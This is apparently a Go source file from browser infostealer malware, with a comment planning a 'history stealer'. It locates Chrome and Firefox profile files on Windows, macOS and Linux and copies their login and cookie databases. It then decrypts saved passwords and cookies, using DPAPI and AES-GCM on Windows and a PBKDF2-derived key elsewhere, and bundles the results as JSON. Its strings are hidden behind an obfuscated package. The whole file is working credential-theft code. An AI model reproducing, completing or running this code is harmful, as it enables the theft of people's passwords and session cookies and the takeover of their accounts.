package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"

	"Cobra/EtaZzN"

	"github.com/Pallinder/go-randomdata"
	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"
)

import "golang.org/x/crypto/pbkdf2"
import "hash"

func NewPbkdf2(password []byte, salt []byte, iter int, keyLen int, h func() hash.Hash) []byte {
	return pbkdf2.Key(password, salt, iter, keyLen, h)
}

/*
	TODO: Add history stealer.
	TODO: Add safari funcs.
	TODO: Get All Files of All users if ran by admin (windows??).
*/

type (
	sCookies struct {
		Cookies []webCookie `json:"Cookies"`
	}
	sLogins struct {
		Logins []webLogins `json:"Logins"`
	}
)

type webCookie struct {
	Host     string `json:"host"`
	Path     string `json:"path"`
	IsSecure string `json:"isSecure"`
	Expiry   string `json:"expiry"`
	Name     string `json:"name"`
	Value    string `json:"value"`
}

type webLogins struct {
	URL      string `json:"URL"`
	Username string `json:"username"`
	Password string `json:"password"`
}

var (
	chromeKey      []byte
	browserReady   bool
	chromeWinReady bool
	chromeMaster   []byte
)

func browserInit() {
	if !browserReady {
		if runtime.GOOS == EtaZzN.X5YyCa19() {
			secret, err := getChromeMacOS()
			if err == nil {
				chromeKey = NewPbkdf2([]byte(secret), []byte(EtaZzN.YzXUle2()), 1003, 16, sha1.New)
			}
		} else if runtime.GOOS == EtaZzN.MTnKnh20() {
			chromeKey = NewPbkdf2([]byte(EtaZzN.Z2LnJI3()), []byte(EtaZzN.YzXUle2()), 1, 16, sha1.New)
		}
		browserReady = true
	}
}

func getChromeLogins() []webLogins {

	var LoginsFiles []string
	var Logins []webLogins

	if runtime.GOOS == EtaZzN.X5YyCa19() {

		searchFor := []string{
			normalizePath(EtaZzN.G6RF9X0()),
			normalizePath(EtaZzN.Y7tVBP1()),
		}

		for _, path := range searchFor {

			results := walkSearch(EtaZzN.ZX4feL7(), path)
			if results != nil {

				LoginsFiles = append(LoginsFiles, results...)
			} else {

			}
		}

	} else if runtime.GOOS == EtaZzN.MTnKnh20() {

		searchFor := []string{
			normalizePath(EtaZzN.B1kaHz4()),
			normalizePath(EtaZzN.Md4Eqe5()),
			normalizePath(EtaZzN.UmVrzg6()),
		}

		for _, path := range searchFor {

			results := walkSearch(EtaZzN.ZX4feL7(), path)
			if results != nil {

				LoginsFiles = append(LoginsFiles, results...)
			} else {

			}
		}

	} else if runtime.GOOS == EtaZzN.PU6kUD18() {

		searchFor := []string{
			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.Y1w7GT9()),
			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.SS6exn10()),
		}

		for _, path := range searchFor {

			results := walkSearch(EtaZzN.ZX4feL7(), path)
			if results != nil {

				LoginsFiles = append(LoginsFiles, results...)
			} else {

			}
		}

	} else {
		return Logins
	}

	getLogins := func(LoginsPATH string, LoginsLists *[][]webLogins, index int, waitSignal *sync.WaitGroup) []webLogins {

		var logins []webLogins

		if runtime.GOOS == EtaZzN.PU6kUD18() {

			if !chromeWinReady {

				LocalStatePATH := filepath.Join(strings.Split(LoginsPATH, string(filepath.Separator))[:8][1:]...) + string(filepath.Separator) + EtaZzN.OuZfym11()
				LocalStatePATH = strings.Split(LoginsPATH, string(filepath.Separator))[:8][:1][0] + string(filepath.Separator) + LocalStatePATH

				if !fileExist(LocalStatePATH) {

					return logins
				}

				s, _ := readFile(LocalStatePATH)
				h := gjson.Get(s, EtaZzN.VUFV2s12())
				if h.Exists() {
					encryptedKey := h.Get(EtaZzN.RKyqPV13()).String()
					if encryptedKey == "" {

					}
					MasterBytes, _ := base64.StdEncoding.DecodeString(encryptedKey)
					master, err := DPApi(MasterBytes[5:])
					if err != nil {

					}
					chromeWinReady = true
					chromeMaster = master
				} else {

				}

			}

			if !chromeWinReady || chromeMaster == nil {

				return logins
			}
		}

		var tmpDir string

		for {

			tmpDir = normalizePath(EtaZzN.N9ytHb14() + randomdata.RandStringRunes(7) + EtaZzN.EP3q1615())
			if _, err := os.Stat(tmpDir); err != nil {
				break
			}

		}

		copyingResult := fileCopy(LoginsPATH, tmpDir)

		defer func() {
			os.Remove(tmpDir)
			waitSignal.Done()
		}()

		if copyingResult {

			db, err := sql.Open(EtaZzN.GAn49u16(), tmpDir)
			if err != nil {

				return logins
			}

			rows, err := db.Query(EtaZzN.RuqIUh17())
			if err != nil {

				return logins
			}

			for rows.Next() {

				var (
					originURL      string
					usernameValue  string
					encryptedValue []byte
				)

				err = rows.Scan(&originURL, &usernameValue, &encryptedValue)
				if err != nil {
					return logins
				}

				if len(encryptedValue) <= 0 {
					continue
				}

				var decryptedValue []byte

				if runtime.GOOS == EtaZzN.PU6kUD18() {

					iv := encryptedValue[3:15]
					payload := encryptedValue[15:]

					block, err := aes.NewCipher(chromeMaster)
					if err != nil {
						continue
					}
					aesgcm, err := cipher.NewGCM(block)
					if err != nil {
						continue
					}

					plainText, err := aesgcm.Open(nil, iv, payload, nil)

					decryptedValue = plainText

				} else {
					ver := string(encryptedValue)[:3]
					if ver != EtaZzN.SOGmDn21() {
						continue
					}
					encryptedValue = encryptedValue[3:]
					block, err := aes.NewCipher(chromeKey)
					if err != nil {
						continue
					}
					mode := cipher.NewCBCDecrypter(block, bytes.Repeat([]byte(" "), 16))
					ciphertext := make([]byte, len(encryptedValue))
					mode.CryptBlocks(ciphertext, encryptedValue)
					length := len(ciphertext)
					unpadding := int(ciphertext[length-1])
					ciphertext = ciphertext[:(length - unpadding)]
					decryptedValue = ciphertext
				}

				Login := webLogins{URL: originURL, Username: usernameValue, Password: string(decryptedValue)}
				logins = append(logins, Login)

			}

			err = rows.Err()
			if err != nil {
				return logins
			}

			rows.Close()
			db.Close()

			if logins != nil {
				(*LoginsLists)[index] = logins
			}

		} else {

		}

		return Logins

	}

	if LoginsFiles != nil {

		Results := make([][]webLogins, len(LoginsFiles))

		waitSignal := sync.WaitGroup{}
		for i, loginFile := range LoginsFiles {
			waitSignal.Add(1)
			go getLogins(loginFile, &Results, i, &waitSignal)
		}

		waitSignal.Wait()

		for _, List := range Results {
			if List != nil && len(List) > 0 {
				Logins = append(Logins, List...)
			}
		}

		return Logins

	}

	return Logins

}

func getfirefoxLogins() []webLogins {

	var LoginsFiles []string
	var Logins []webLogins

	if runtime.GOOS == EtaZzN.X5YyCa19() {

		searchFor := []string{
			normalizePath(EtaZzN.Ei9zrm22()),
		}

		for _, path := range searchFor {

			results := walkSearch(EtaZzN.RLJebv23(), path)
			if results != nil {

				LoginsFiles = append(LoginsFiles, results...)
			} else {

			}
		}

	} else if runtime.GOOS == EtaZzN.MTnKnh20() {

		searchFor := []string{
			normalizePath(EtaZzN.VFFVIi24()),
		}

		for _, path := range searchFor {

			results := walkSearch(EtaZzN.RLJebv23(), path)
			if results != nil {

				LoginsFiles = append(LoginsFiles, results...)
			} else {

			}
		}

	} else if runtime.GOOS == EtaZzN.PU6kUD18() {

		searchFor := []string{
			filepath.Join(os.Getenv(EtaZzN.XigTkw25()), EtaZzN.SApO0F28()),
			filepath.Join(os.Getenv(EtaZzN.NUepLV26()), EtaZzN.SApO0F28()),
			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.MRZQfO27()),
		}

		for _, path := range searchFor {

			results := walkSearch(EtaZzN.RLJebv23(), path)
			if results != nil {

				LoginsFiles = append(LoginsFiles, results...)
			} else {

			}
		}

	} else {
		return Logins
	}

	getLogins := func(LoginsPATH string, LoginsLists *[][]webLogins, index int, waitSignal *sync.WaitGroup) []webLogins {

		var tmpDir string

		for {

			tmpDir = normalizePath(EtaZzN.N9ytHb14() + randomdata.RandStringRunes(7) + EtaZzN.EP3q1615())
			if _, err := os.Stat(tmpDir); err != nil {
				break
			}

		}

		dir, _ := filepath.Split(LoginsPATH)
		DecryptKeyPATH := filepath.Join(dir, EtaZzN.Sax7kM29())

		copyingResult := fileCopy(DecryptKeyPATH, tmpDir)

		defer func() {
			os.Remove(tmpDir)
			waitSignal.Done()
		}()

		if copyingResult {

			var logins []webLogins

			s, err := ioutil.ReadFile(LoginsPATH)
			if err != nil {

				return logins
			}

			profile, err := New(tmpDir, []byte("") /* masterPassword, default is empty */)
			if err != nil {

				return logins
			}

			h := gjson.GetBytes(s, EtaZzN.NmaONw30())
			if h.Exists() {

				for _, v := range h.Array() {

					LoginURL := v.Get(EtaZzN.ZmvKDe31()).String()
					user, err := profile.DecryptField(v.Get(EtaZzN.CAGYQa32()).String())
					if err != nil {

					}
					pwd, err := profile.DecryptField(v.Get(EtaZzN.ZKcQNZ33()).String())
					if err != nil {

					}

					Login := webLogins{URL: LoginURL, Username: string((user)), Password: string((pwd))}
					logins = append(logins, Login)

				}

			} else {

			}

			if logins != nil {
				(*LoginsLists)[index] = logins
			}

		} else {

		}

		return Logins

	}

	if LoginsFiles != nil {

		Results := make([][]webLogins, len(LoginsFiles))

		waitSignal := sync.WaitGroup{}
		for i, loginFile := range LoginsFiles {
			waitSignal.Add(1)
			go getLogins(loginFile, &Results, i, &waitSignal)
		}

		waitSignal.Wait()

		for _, List := range Results {
			if List != nil && len(List) > 0 {
				Logins = append(Logins, List...)
			}
		}

		return Logins

	}

	return Logins

}

func getfirefoxCookies() []webCookie {

	var cookiesFiles []string
	var webCookies []webCookie

	if runtime.GOOS == EtaZzN.X5YyCa19() {

		searchFor := []string{
			normalizePath(EtaZzN.Ei9zrm22()),
		}

		for _, path := range searchFor {
			results := walkSearch(EtaZzN.BvpVia34(), path)
			if results != nil {
				cookiesFiles = append(cookiesFiles, results...)
			}
		}

	} else if runtime.GOOS == EtaZzN.MTnKnh20() {

		searchFor := []string{
			normalizePath(EtaZzN.VFFVIi24()),
		}

		for _, path := range searchFor {
			results := walkSearch(EtaZzN.BvpVia34(), path)
			if results != nil {
				cookiesFiles = append(cookiesFiles, results...)
			}
		}

	} else if runtime.GOOS == EtaZzN.PU6kUD18() {

		searchFor := []string{
			filepath.Join(os.Getenv(EtaZzN.XigTkw25()), EtaZzN.SApO0F28()),
			filepath.Join(os.Getenv(EtaZzN.NUepLV26()), EtaZzN.SApO0F28()),
			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.MRZQfO27()),
		}

		for _, path := range searchFor {
			results := walkSearch(EtaZzN.BvpVia34(), path)
			if results != nil {
				cookiesFiles = append(cookiesFiles, results...)
			}
		}

	} else {
		return webCookies
	}

	getCookies := func(cookiePATH string, cookiesLists *[][]webCookie, index int, waitSignal *sync.WaitGroup) []webCookie {

		var tmpDir string

		for {

			tmpDir = normalizePath(EtaZzN.N9ytHb14() + randomdata.RandStringRunes(7) + EtaZzN.EP3q1615())
			if _, err := os.Stat(tmpDir); err != nil {
				break
			}

		}

		copyingResult := fileCopy(cookiePATH, tmpDir)

		defer func() {
			os.Remove(tmpDir)
			waitSignal.Done()
		}()

		if copyingResult {

			var Cookies []webCookie

			db, err := sql.Open(EtaZzN.GAn49u16(), tmpDir)
			if err != nil {
				return Cookies
			}

			rows, err := db.Query(EtaZzN.KeuQP035())
			if err != nil {
				return Cookies
			}

			for rows.Next() {

				var (
					host     string
					path     string
					isSecure string
					expiry   string
					name     string
					value    string
				)

				err = rows.Scan(&host, &path, &isSecure, &expiry, &name, &value)
				if err != nil {
					return Cookies
				}

				Cookie := webCookie{Host: host, Path: path, IsSecure: isSecure, Expiry: expiry, Name: name, Value: value}
				Cookies = append(Cookies, Cookie)

			}

			err = rows.Err()
			if err != nil {
				return Cookies
			}

			rows.Close()
			db.Close()

			if Cookies != nil {
				(*cookiesLists)[index] = Cookies
			}

		}

		return webCookies

	}

	if cookiesFiles != nil {

		Results := make([][]webCookie, len(cookiesFiles))

		waitSignal := sync.WaitGroup{}
		for i, cookieFile := range cookiesFiles {
			waitSignal.Add(1)
			go getCookies(cookieFile, &Results, i, &waitSignal)
		}

		waitSignal.Wait()

		for _, List := range Results {
			if List != nil && len(List) > 0 {
				webCookies = append(webCookies, List...)
			}
		}

		return webCookies

	}

	return webCookies

}

func getChromeCookies() []webCookie {

	var cookiesFiles []string
	var webCookies []webCookie

	if runtime.GOOS == EtaZzN.X5YyCa19() {

		searchFor := []string{
			normalizePath(EtaZzN.G6RF9X0()),
			normalizePath(EtaZzN.Y7tVBP1()),
		}

		for _, path := range searchFor {
			results := walkSearch(EtaZzN.MIhINU36(), path)
			if results != nil {
				cookiesFiles = append(cookiesFiles, results...)
			}
		}

	} else if runtime.GOOS == EtaZzN.MTnKnh20() {

		searchFor := []string{
			normalizePath(EtaZzN.B1kaHz4()),
			normalizePath(EtaZzN.Md4Eqe5()),
			normalizePath(EtaZzN.UmVrzg6()),
		}

		for _, path := range searchFor {
			results := walkSearch(EtaZzN.MIhINU36(), path)
			if results != nil {
				cookiesFiles = append(cookiesFiles, results...)
			}
		}

	} else if runtime.GOOS == EtaZzN.PU6kUD18() {

		searchFor := []string{
			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.Y1w7GT9()),
			filepath.Join(os.Getenv(EtaZzN.VOjMIK8()), EtaZzN.SS6exn10()),
		}

		for _, path := range searchFor {
			results := walkSearch(EtaZzN.MIhINU36(), path)
			if results != nil {
				cookiesFiles = append(cookiesFiles, results...)
			}
		}

	} else {
		return webCookies
	}

	getCookies := func(cookiePATH string, cookiesLists *[][]webCookie, index int, waitSignal *sync.WaitGroup) []webCookie {

		var Cookies []webCookie

		if runtime.GOOS == EtaZzN.PU6kUD18() {

			if !chromeWinReady {

				LocalStatePATH := filepath.Join(strings.Split(cookiePATH, string(filepath.Separator))[:8][1:]...) + string(filepath.Separator) + EtaZzN.OuZfym11()
				LocalStatePATH = strings.Split(cookiePATH, string(filepath.Separator))[:8][:1][0] + string(filepath.Separator) + LocalStatePATH

				if !fileExist(LocalStatePATH) {

					return Cookies
				}

				s, _ := readFile(LocalStatePATH)
				h := gjson.Get(s, EtaZzN.VUFV2s12())
				if h.Exists() {
					encryptedKey := h.Get(EtaZzN.RKyqPV13()).String()
					if encryptedKey == "" {

					}
					MasterBytes, _ := base64.StdEncoding.DecodeString(encryptedKey)
					master, err := DPApi(MasterBytes[5:])
					if err != nil {

					}
					chromeWinReady = true
					chromeMaster = master
				} else {

				}

			}

			if !chromeWinReady || chromeMaster == nil {

				return Cookies
			}

		}

		var tmpDir string

		for {

			tmpDir = normalizePath(EtaZzN.N9ytHb14() + randomdata.RandStringRunes(7) + EtaZzN.EP3q1615())
			if _, err := os.Stat(tmpDir); err != nil {
				break
			}

		}

		copyingResult := fileCopy(cookiePATH, tmpDir)

		defer func() {
			os.Remove(tmpDir)
			waitSignal.Done()
		}()

		if copyingResult {

			db, err := sql.Open(EtaZzN.GAn49u16(), tmpDir)
			if err != nil {
				return Cookies
			}

			rows, err := db.Query(EtaZzN.YfyBWY37())
			if err != nil {
				return Cookies
			}

			for rows.Next() {

				var (
					host           string
					path           string
					isSecure       string
					expiry         string
					name           string
					value          string
					encryptedValue []byte
				)

				err = rows.Scan(&host, &path, &isSecure, &expiry, &name, &value, &encryptedValue)
				if err != nil {
					return Cookies
				}

				if len(encryptedValue) <= 0 {
					continue
				}

				var decryptedValue []byte

				if runtime.GOOS == EtaZzN.PU6kUD18() {

					iv := encryptedValue[3:15]
					payload := encryptedValue[15:]

					block, err := aes.NewCipher(chromeMaster)
					if err != nil {
						continue
					}
					aesgcm, err := cipher.NewGCM(block)
					if err != nil {
						continue
					}

					plainText, err := aesgcm.Open(nil, iv, payload, nil)

					decryptedValue = plainText

				} else {
					ver := string(encryptedValue)[:3]
					if ver != EtaZzN.SOGmDn21() {
						continue
					}
					encryptedValue = encryptedValue[3:]
					block, err := aes.NewCipher(chromeKey)
					if err != nil {
						continue
					}
					mode := cipher.NewCBCDecrypter(block, bytes.Repeat([]byte(" "), 16))
					ciphertext := make([]byte, len(encryptedValue))
					mode.CryptBlocks(ciphertext, encryptedValue)
					length := len(ciphertext)
					unpadding := int(ciphertext[length-1])
					ciphertext = ciphertext[:(length - unpadding)]
					decryptedValue = ciphertext
				}

				Cookie := webCookie{Host: host, Path: path, IsSecure: isSecure, Expiry: expiry, Name: name, Value: string(decryptedValue)}
				Cookies = append(Cookies, Cookie)

			}

			err = rows.Err()
			if err != nil {
				return Cookies
			}

			rows.Close()
			db.Close()

			if Cookies != nil {
				(*cookiesLists)[index] = Cookies
			}

		}

		return webCookies

	}

	if cookiesFiles != nil {

		Results := make([][]webCookie, len(cookiesFiles))

		waitSignal := sync.WaitGroup{}
		for i, cookieFile := range cookiesFiles {
			waitSignal.Add(1)
			go getCookies(cookieFile, &Results, i, &waitSignal)
		}

		waitSignal.Wait()

		for _, List := range Results {
			if List != nil && len(List) > 0 {
				webCookies = append(webCookies, List...)
			}
		}

		return webCookies

	}

	return webCookies

}

func getCookiesRaw() (string, error) {

	FireFoxCookies := getfirefoxCookies()
	ChromeCookies := getChromeCookies()

	if len(FireFoxCookies) > 0 || len(ChromeCookies) > 0 {

		jsonCookies, err := json.Marshal(&sCookies{Cookies: append(ChromeCookies, FireFoxCookies...)})
		if err != nil {
			return "", err
		}
		return string(jsonCookies), nil

	}

	return "", nil

}

func getLoginsRaw() (string, error) {

	FireFoxLogins := getfirefoxLogins()
	ChromeLogins := getChromeLogins()

	if len(FireFoxLogins) > 0 || len(ChromeLogins) > 0 {

		jsonLogins, err := json.Marshal(&sLogins{Logins: append(ChromeLogins, FireFoxLogins...)})
		if err != nil {
			return "", err
		}
		return string(jsonLogins), nil

	}

	return "", nil

}
